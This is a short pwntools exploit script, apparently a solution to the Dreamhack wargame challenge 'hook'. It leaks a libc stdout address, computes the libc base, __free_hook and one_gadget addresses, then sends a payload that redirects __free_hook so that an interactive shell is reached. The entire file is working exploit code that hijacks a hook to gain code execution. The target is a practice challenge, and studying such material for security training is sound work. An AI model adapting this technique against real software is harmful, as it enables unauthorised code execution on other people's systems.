from pwn import *

e = ELF('./hook')

# LOCAL
#r = process("./hook")
#libc = e.libc

# REMOTE
r = remote("host3.dreamhack.games", 9268)
libc = ELF('./libc.so.6')

LIBC_STDOUT_OFFSET = libc.symbols["_IO_2_1_stdout_"]
LIBC_FREE_HOOK_OFFSET = libc.symbols["__free_hook"]
ONE_GADGET_LIST = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

# 1. Leak Libc Base
r.recvuntil(b'stdout: ')

LIBC_STDOUT = int(r.recvuntil(b'\n', drop=True).decode(), 0)

LIBC_BASE = LIBC_STDOUT - LIBC_STDOUT_OFFSET
LIBC_FREE_HOOK = LIBC_BASE + LIBC_FREE_HOOK_OFFSET
LIBC_ONE_GADGET = LIBC_BASE + ONE_GADGET_LIST[3]

print('[+] Libc base addr is ' + str(hex(LIBC_BASE)))
print('[+] Libc __free_hook addr is ' + str(hex(LIBC_FREE_HOOK)))
print('[+] Libc One Gadget addr is ' + str(hex(LIBC_ONE_GADGET)))

# 2. Setting ptr
r.recvuntil(b'Size: ')
r.sendline(b'16')

PAYLOAD = p64(LIBC_FREE_HOOK) + p64(e.symbols['main'] + 199)

r.recvuntil(b'Data: ')
r.send(PAYLOAD)

r.interactive()